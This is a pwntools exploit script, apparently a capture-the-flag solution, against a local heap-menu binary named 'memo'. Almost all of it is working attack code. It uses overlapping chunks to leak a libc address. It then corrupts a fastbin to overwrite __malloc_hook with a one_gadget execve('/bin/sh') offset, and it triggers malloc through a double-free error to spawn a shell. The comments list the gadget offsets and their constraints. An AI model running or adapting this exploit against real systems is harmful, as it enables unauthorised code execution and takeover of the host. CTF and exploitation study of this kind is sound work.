from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

file = "./memo"
bin = ELF("./memo")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
conn = process(file)
#gdb.attach(conn)

indexes = [0]*10

def menu(ch):
  conn.recvuntil("5. Exit")
  conn.sendline(str(ch))

def create(size, content):
  menu(1)
  conn.recvuntil("memo size: ")
  conn.sendline(str(size))
  conn.recvuntil("content: ")
  conn.send(content)
  for i in range(10):
    if indexes[i] == 0:
      indexes[i] = 1
      return i
  assert(False)

def edit(idx, content):
  menu(2)
  conn.recvuntil("idx: ")
  conn.sendline(str(idx))
  conn.recvuntil("content: ")
  conn.send(content)

def delete(idx):
  menu(3)
  conn.recvuntil("idx: ")
  conn.sendline(str(idx))
  indexes[idx] = 0

def show(idx):
  menu(4)
  conn.recvuntil("idx: ")
  conn.sendline(str(idx))
  conn.recvuntil("content: ")

# Overlapping chunks
id1 = create(0x100, "a\n")
id2 = create(0x98, "b\n")
id3 = create(0xf0, "c\n")
id4 = create(0xf0, "d\n")

delete(id1)
edit(id2, "\x00"*0x90 + p64(0x110 + 0xa0))
delete(id3)

# A big chunk is freed, id2 is part of that

# Leaking libc
id5 = create(0x100, "a\n")
show(id2)
libc_leak = u64(conn.recvn(6) + "\x00\x00")
libc.address = libc_leak - 0x7f5fcfd0fb78 + 0x7f5fcf94b000
delete(id5)

# Cleanup
delete(id4)

# Fastbin corruption
id1 = create(0x100, "a\n")
id2 = create(0x68, "b\n")
id3 = create(0xf0, "c\n")
id4 = create(0xf0, "d\n")
delete(id1)
edit(id2, "\x00"*0x60 + p64(0x110 + 0x70))
delete(id3)
delete(id2)
payload = "\x00"*0x100 + \
          p64(0) + p64(0x71) + \
          p64(libc.symbols['__malloc_hook'] - 0x23) + \
          "\x00"*0x58 + \
          p64(0) + p64(0x71)
id5 = create(0x270, payload + "\n")
id6 = create(0x60, "a\n")

"""
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""
payload = "\x00"*0x13 + p64(libc.address + 0xf02a4)
id7 = create(0x60, payload + "\n")

# rip control
delete(id5)
# leads to error condition which calls strdup and hence malloc!
delete(id6)

log.info("Libc leak: " + hex(libc_leak))

conn.interactive()
